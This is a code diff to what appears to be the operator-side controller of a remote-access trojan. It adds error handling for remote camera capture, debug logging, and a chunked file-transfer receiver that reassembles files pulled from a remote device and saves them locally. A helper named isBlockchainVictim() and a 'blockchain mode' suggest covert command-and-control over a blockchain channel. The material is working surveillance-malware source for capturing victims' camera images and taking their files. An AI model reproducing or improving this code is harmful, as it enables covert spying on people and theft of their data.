             $camCtrl.lastError = data.error || 'Camera capture failed';
             $rootScope.Log(`[✗] Camera capture failed: ${data.error || 'Unknown error'}`, CONSTANTS.logStatus.FAIL);
-            $camCtrl.$apply();
+            if (!$scope.$$phase && !$scope.$root.$$phase) {
+                $scope.$apply();
+            }
         }
+        
+        // Final apply at the very end of the handler
+        $timeout(() => {
+            if (!$scope.$$phase && !$scope.$root.$$phase) {
+                $scope.$apply();
+            }
+        }, 0);
     });
 
     // Initial load - get camera list with connection check
@@ -1359,6 +1859,11 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
             $camCtrl.lastError = null;
             
             console.log('[CamCtrl] Received camera data:', data);
+            console.log('[CamCtrl] data.image:', data.image);
+            console.log('[CamCtrl] data.buffer type:', typeof data.buffer);
+            console.log('[CamCtrl] data.buffer length:', data.buffer ? data.buffer.length : 0);
+            console.log('[CamCtrl] data.buffer preview (first 200):', data.buffer ? data.buffer.substring(0, 200) : 'no buffer');
+            console.log('[CamCtrl] data.buffer preview (last 100):', data.buffer ? data.buffer.substring(Math.max(0, data.buffer.length - 100)) : 'no buffer');
             
             // Handle error responses
             if (data.error) {
@@ -1556,6 +2061,9 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
         return true;
     }
 
+    // Chunked file transfer state tracking
+    const chunkedTransfers = new Map(); // transferId -> {chunks: Map, totalChunks, fileName, filePath, receivedChunks: Set}
+    
     // Socket handler
     socket.on(fileManager, (data) => {
         console.log('[FmCtrl] Received file manager data:', typeof data, Array.isArray(data) ? `Array(${data.length})` : (data ? Object.keys(data).join(',') : 'null'));
@@ -1563,6 +2071,12 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
         if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
             // Empty data - might be from blockchain response issue
             console.warn('[FmCtrl] Empty data received, ignoring');
+            return;
+        }
+        
+        // Handle chunked file transfer
+        if (data.chunked === true && data.transferId) {
+            handleChunkedFileTransfer(data);
             return;
         }
         
@@ -1638,8 +2152,8 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
             } else {
                 $rootScope.Log(`[✗] Failed to delete: ${fileData.path}`, CONSTANTS.logStatus.FAIL);
             }
-        } else if (fileData.file == true) {
-            // File download response
+        } else if (fileData.file == true && !fileData.chunked) {
+            // Non-chunked file download response
             $rootScope.Log('[→] Downloading file...', CONSTANTS.logStatus.INFO);
             var filePath = path.join(downloadsPath, fileData.name);
             fs.outputFile(filePath, fileData.buffer, (err) => {
@@ -1662,6 +2176,155 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
             }
         }
     });
+    
+    /**
+     * Handle chunked file transfer
+     */
+    function handleChunkedFileTransfer(data) {
+        const transferId = data.transferId;
+        
+        // Check if this is the initial transfer info
+        if (data.chunkIndex === undefined && data.totalChunks !== undefined) {
+            console.log(`[FmCtrl] Starting chunked transfer: ${data.name} (${data.totalChunks} chunks, ${data.size} bytes)`);
+            $rootScope.Log(`[→] Receiving chunked file: ${data.name} (${data.totalChunks} chunks)`, CONSTANTS.logStatus.INFO);
+            
+            // Initialize transfer state
+            chunkedTransfers.set(transferId, {
+                chunks: new Map(), // chunkIndex -> buffer
+                totalChunks: data.totalChunks,
+                fileName: data.name,
+                filePath: data.path,
+                fileSize: data.size,
+                receivedChunks: new Set(),
+                startTime: Date.now()
+            });
+            return;
+        }
+        
+        // Handle chunk data
+        if (data.chunkIndex !== undefined && data.buffer !== undefined) {
+            const transfer = chunkedTransfers.get(transferId);
+            if (!transfer) {
+                console.warn(`[FmCtrl] Received chunk for unknown transfer: ${transferId}`);
+                return;
+            }
+            
+            const chunkIndex = data.chunkIndex;
+            
+            // Store chunk if not already received
+            if (!transfer.receivedChunks.has(chunkIndex)) {
+                // Convert buffer to Buffer if needed
+                let chunkBuffer;
+                if (Buffer.isBuffer(data.buffer)) {
+                    chunkBuffer = data.buffer;
+                } else if (data.buffer instanceof ArrayBuffer) {
+                    chunkBuffer = Buffer.from(data.buffer);
+                } else if (Array.isArray(data.buffer)) {
+                    chunkBuffer = Buffer.from(data.buffer);
+                } else if (typeof data.buffer === 'string') {
+                    // Base64 encoded
+                    chunkBuffer = Buffer.from(data.buffer, 'base64');
+                } else {
+                    console.error('[FmCtrl] Unknown buffer format for chunk:', typeof data.buffer);
+                    return;
+                }
+                
+                transfer.chunks.set(chunkIndex, chunkBuffer);
+                transfer.receivedChunks.add(chunkIndex);
+                
+                console.log(`[FmCtrl] Received chunk ${chunkIndex + 1}/${transfer.totalChunks} for transfer ${transferId}`);
+                
+                // Send ACK to client
+                sendChunkAck(transferId, chunkIndex);
+                
+                // Check if all chunks received
+                if (transfer.receivedChunks.size === transfer.totalChunks) {
+                    assembleAndSaveFile(transferId, transfer);
+                }
+            } else {
+                // Chunk already received, just send ACK
+                sendChunkAck(transferId, chunkIndex);
+            }
+        }
+    }
+    
+    /**
+     * Send chunk ACK to client
+     */
+    function sendChunkAck(transferId, chunkIndex) {
+        try {
+            const ackData = {
+                transferId: transferId,
+                chunkIndex: chunkIndex
+            };
+            
+            // Send via socket wrapper (works for both TCP/IP and blockchain)
+            if (checkConnection()) {
+                // Use socket wrapper which handles both TCP/IP and blockchain modes
+                if (originalSocket && originalSocket.connected) {
+                    originalSocket.emit('chunk_ack', ackData);
+                    console.log(`[FmCtrl] Sent chunk ACK: ${transferId}:${chunkIndex}`);
+                } else if (isBlockchainVictim()) {
+                    // For blockchain mode, ACKs would need to be sent via blockchain response
+                    // For now, we'll just log it - the client will retransmit if needed
+                    console.log(`[FmCtrl] Chunk ACK (blockchain mode - ACK via response): ${transferId}:${chunkIndex}`);
+                    // Note: In blockchain mode, the client tracks chunks and will retransmit
+                    // if ACKs are missing. The server can include ACK info in the response.
+                }
+            }
+        } catch (err) {
+            console.error('[FmCtrl] Error sending chunk ACK:', err);
+        }
+    }
+    
+    /**
+     * Assemble chunks and save file
+     */
+    function assembleAndSaveFile(transferId, transfer) {
+        try {
+            console.log(`[FmCtrl] Assembling file: ${transfer.fileName} (${transfer.chunks.size} chunks)`);
+            
+            // Sort chunks by index
+            const sortedChunks = [];
+            for (let i = 0; i < transfer.totalChunks; i++) {
+                const chunk = transfer.chunks.get(i);
+                if (!chunk) {
+                    console.error(`[FmCtrl] Missing chunk ${i} for transfer ${transferId}`);
+                    $rootScope.Log(`[✗] Missing chunk ${i} for ${transfer.fileName}`, CONSTANTS.logStatus.FAIL);
+                    chunkedTransfers.delete(transferId);
+                    return;
+                }
+                sortedChunks.push(chunk);
+            }
+            
+            // Concatenate all chunks
+            const fileBuffer = Buffer.concat(sortedChunks);
+            
+            // Verify size
+            if (fileBuffer.length !== transfer.fileSize) {
+                console.warn(`[FmCtrl] File size mismatch: expected ${transfer.fileSize}, got ${fileBuffer.length}`);
+            }
+            
+            // Save file
+            const filePath = path.join(downloadsPath, transfer.fileName);
+            fs.outputFile(filePath, fileBuffer, (err) => {
+                if (err) {
+                    console.error('[FmCtrl] Error saving file:', err);
+                    $rootScope.Log(`[✗] Failed to save file: ${transfer.fileName}`, CONSTANTS.logStatus.FAIL);
+                } else {
+                    const elapsed = ((Date.now() - transfer.startTime) / 1000).toFixed(1);
+                    const sizeMB = (transfer.fileSize / 1024 / 1024).toFixed(2);
+                    console.log(`[FmCtrl] File saved: ${filePath} (${sizeMB} MB, ${elapsed}s)`);
+                    $rootScope.Log(`[✓] File saved: ${transfer.fileName} (${sizeMB} MB, ${elapsed}s)`, CONSTANTS.logStatus.SUCCESS);
+                }
+                chunkedTransfers.delete(transferId);
+            });
+        } catch (err) {
+            console.error('[FmCtrl] Error assembling file:', err);
+            $rootScope.Log(`[✗] Error assembling file: ${transfer.fileName}`, CONSTANTS.logStatus.FAIL);
+            chunkedTransfers.delete(transferId);
+        }
+    }
 
     // Initial load - ensure listener is registered first
     updatePathParts($fmCtrl.currentPath);
